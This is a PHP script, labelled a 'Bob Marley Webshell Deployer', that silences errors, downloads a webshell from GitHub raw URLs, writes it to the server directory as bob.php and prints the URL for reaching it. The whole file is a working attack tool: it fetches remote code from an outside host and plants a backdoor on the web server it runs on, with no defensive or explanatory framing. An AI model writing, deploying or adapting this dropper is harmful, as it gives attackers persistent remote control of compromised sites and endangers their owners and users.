<?php
@error_reporting(0);
@set_time_limit(0);

// Bob Marley Webshell Deployer with URL Display
$urls = [
    'https://raw.githubusercontent.com/Bob-Marley-Backup/LAB-Uncomplete/refs/heads/main/bob.php',
    'https://raw.githubusercontent.com/Bob-Marley-Backup/LAB-Uncomplete/refs/heads/main/phpinfo.php'
];

$target = __DIR__ . '/bob.php';
$success = false;

foreach($urls as $idx => $url) {
    $content = @file_get_contents($url);
    
    // Validate content (must be at least 1000 bytes)
    if($content && strlen($content) > 1000) {
        if(@file_put_contents($target, $content)) {
            // Build full URL
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'];
            $currentDir = dirname($_SERVER['REQUEST_URI']);
            $webshellUrl = $protocol . '://' . $host . $currentDir . '/bob.php';
            
            if($idx === 0) {
                echo '[DEPLOY_SUCCESS] Bob Marley shell deployed' . "\n";
                echo 'Visit -> ' . $webshellUrl;
            } else {
                echo '[DEPLOY_SUCCESS] Fallback phpinfo shell deployed' . "\n";
                echo 'Visit -> ' . $webshellUrl;
            }
            $success = true;
            break;
        }
    }
}

if(!$success) {
    echo '[DEPLOY_FAILED] Cannot download or write webshell';
}
?>
